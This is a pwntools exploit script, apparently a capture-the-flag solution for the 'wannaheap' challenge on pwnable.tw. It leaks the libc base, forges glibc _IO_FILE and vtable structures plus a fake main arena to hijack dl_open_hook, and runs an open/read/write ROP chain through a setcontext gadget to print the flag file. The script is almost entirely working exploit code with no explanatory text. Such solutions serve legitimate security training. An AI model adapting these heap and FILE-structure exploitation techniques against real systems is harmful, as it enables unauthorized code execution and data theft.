from pwn import *


class IO_FILE_plus(object):
    def __init__(self, arch=64):
        self.arch = arch

    def construct(self, flags=0, read_ptr=0, read_end=0, read_base=0, write_base=0, write_ptr=0, write_end=0,
                  buf_base=0, buf_end=0, save_base=0, backup_base=0, save_end=0, markers=0, chain=0, fileno=0, flags2=0,
                  old_offset=0, cur_column=0, vtable_offset=0, shortbuf=0, lock=0, offset=0, codecvt=0, wide_data=0,
                  freeres_list=0, freeres_buf=0, pad5=0, mode=0, unused2=b'\x00' * 20, vtable=0):
        if self.arch == 32:
            return p32(flags) + p32(read_ptr) + p32(read_end) + p32(read_base) + p32(write_base) + p32(write_ptr) + p32(
                write_end) + p32(buf_base) + p32(buf_end) + p32(save_base) + p32(backup_base) + p32(save_end) + p32(
                markers) + p32(chain) + p32(fileno) + p32(flags2) + p32(old_offset) + p16(cur_column) + p8(
                vtable_offset) + p8(shortbuf) + p32(lock) + p32(offset) + p32(codecvt) + p32(wide_data) + p32(
                freeres_list) + p32(freeres_buf) + p32(pad5) + p32(mode) + unused2 + p32(0) * 6 + p64(vtable)
        elif self.arch == 64:
            return p32(flags) + p32(0) + p64(read_ptr) + p64(read_end) + p64(read_base) + p64(write_base) + p64(
                write_ptr) + p64(write_end) + p64(buf_base) + p64(buf_end) + p64(save_base) + p64(backup_base) + p64(
                save_end) + p64(markers) + p64(chain) + p32(fileno) + p32(flags2) + p64(old_offset) + p16(
                cur_column) + p8(vtable_offset) + p8(shortbuf) + p32(0) + p64(lock) + p64(offset) + p64(codecvt) + p64(
                wide_data) + p64(freeres_list) + p64(freeres_buf) + p64(pad5) + p32(mode) + unused2 + p64(vtable)


class IO_jump_t(object):
    def __init__(self, arch=64):
        self.arch = arch

    def construct(self, dummy=0, dummy2=0, finish=0, overflow=0, underflow=0, uflow=0, pbackfail=0, xsputn=0, xsgetn=0,
                  seekoff=0, seekpos=0, setbuf=0, sync=0, doallocate=0, read=0, write=0, seek=0, close=0, stat=0,
                  showmanyc=0, imbue=0):
        if self.arch == 32:
            return p32(dummy) + p32(dummy2) + p32(finish) + p32(overflow) + p32(underflow) + p32(uflow) + p32(
                pbackfail) + p32(xsputn) + p32(xsgetn) + p32(seekoff) + p32(seekpos) + p32(setbuf) + p32(sync) + p32(
                doallocate) + p32(read) + p32(write) + p32(seek) + p32(close) + p32(stat) + p32(showmanyc) + p32(imbue)
        elif self.arch == 64:
            return p64(dummy) + p64(dummy2) + p64(finish) + p64(overflow) + p64(underflow) + p64(uflow) + p64(
                pbackfail) + p64(xsputn) + p64(xsgetn) + p64(seekoff) + p64(seekpos) + p64(setbuf) + p64(sync) + p64(
                doallocate) + p64(read) + p64(write) + p64(seek) + p64(close) + p64(stat) + p64(showmanyc) + p64(imbue)


def find_IO_str_jumps(fname):
    libc = ELF(fname)
    IO_file_jumps_offset = libc.sym[b'_IO_file_jumps']
    IO_str_underflow_offset = libc.sym[b'_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
        if possible_IO_str_jumps_offset > IO_file_jumps_offset:
            return possible_IO_str_jumps_offset


elf = ELF('wannaheap')
libc = ELF('libc.so')


def create(key, data):
    r.sendafter(b'> ', b'A')
    r.sendafter(b'key :', key)
    r.sendafter(b'data :', data)


def show(key):
    r.sendafter(b'> ', b'R')
    r.sendafter(b'key:', key)
    return r.recvline()[7:-1]


mmap_size = 0x314000

stdin_struct_offset = 0x3c18c0
stdin_buf_base_offset = stdin_struct_offset + 0x38
stdin_lock_offset = 0x3c3770
stdout_struct_offset = 0x3c2600
dl_open_hook_offset = 0x3c62e0
IO_file_jumps_offset = 0x3be400

L_nop = 0x10f80
L_pop_rdi = 0x1fd7a
L_pop_rsi = 0x1fcbd
L_pop_rdx = 0x1b92
L_pop_rax = 0x3a998
L_syscall = 0xbc765
setcontext_gadget = 0x48045
L_set_call = 0x6ebbb  # mov rdi, rax ; call [rax+0x20]

with log.progress('leaking libc') as l:
    while True:
        r = remote('chall.pwnable.tw', 10305)

        r.sendlineafter(b'Size :', str(mmap_size - 0x10 + stdin_buf_base_offset).encode())
        r.sendlineafter(b'Size :', str(0x313370).encode())
        r.sendlineafter(b'Content :', b'AAAA')

        create(b'Z', b'AAAA')
        create(b'1\x89', b'a' * 0x9)

        try:
            stdout_struct_addr = u64(b'\x00' + show(b'1\x89')[9:] + b'\x00\x00')
            libc_base = stdout_struct_addr - stdout_struct_offset
            l.success('libc_base: ' + hex(libc_base))
            break
        except:
            r.close()
            continue

r.send(b'R')
r.send(p64(libc_base + stdin_buf_base_offset + 0x1200))

with log.progress('creating file structure') as l:
    IO_file = IO_FILE_plus(arch=64)
    stream = IO_file.construct(buf_end=libc_base + stdin_buf_base_offset + 0x1200,
                               lock=libc_base + stdin_lock_offset,
                               mode=0xffffffff,
                               vtable=libc_base + IO_file_jumps_offset)
    stream = stream[0x40:]
    fake_chunk = p64(0) + p64(0x3f1) + p64(0) + p64(
        libc_base + dl_open_hook_offset - 0x10) + b'AZ\x00\x00\x00\x00\x00\x00'
    ROPchain = p64(libc_base + L_pop_rdi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rsi) + p64(0) + \
               p64(libc_base + L_pop_rdx) + p64(0) + \
               p64(libc_base + L_pop_rax) + p64(2) + \
               p64(libc_base + L_syscall) + \
               p64(libc_base + L_pop_rdi) + p64(1) + \
               p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rdx) + p64(0x100) + \
               p64(libc_base + L_pop_rax) + p64(0) + \
               p64(libc_base + L_syscall) + \
               p64(libc_base + L_pop_rdi) + p64(0) + \
               p64(libc_base + L_pop_rsi) + p64(libc_base + stdin_struct_offset + 0x1e0) + \
               p64(libc_base + L_pop_rdx) + p64(0x100) + \
               p64(libc_base + L_pop_rax) + p64(1) + \
               p64(libc_base + L_syscall)
    argument = b'/home/wannaheap/flag\x00'
    l.success()

with log.progress('sending ropchain') as l:
    func_ptrs = p64(libc_base + 0x3bdec0) + p64(0) + p64(libc_base + 0x88680) + p64(libc_base + 0x88260) + p64(0) + p64(
        0)
    fake_main_arena = p32(0) + p32(1) + p64(0) * 10 + p64(libc_base + L_set_call) + p64(0) + p64(
        libc_base + stdin_struct_offset + 0xe0) + p64(libc_base + stdin_struct_offset + 0xe0)
    fake_frame = p64(libc_base + setcontext_gadget) + p64(0) * 15 + p64(libc_base + stdin_struct_offset + 0x108) + p64(
        libc_base + L_nop)

    payload = stream + fake_chunk + (ROPchain + argument).ljust(0x108,
                                                                b'\x00') + func_ptrs + fake_main_arena + fake_frame
    sleep(1)
    r.send(payload)
    l.success()

with log.progress('retriving flag') as l:
    r.recvuntil(b"FLAG")
    flag = r.recvline().decode()
    l.success("FLAG" + flag)
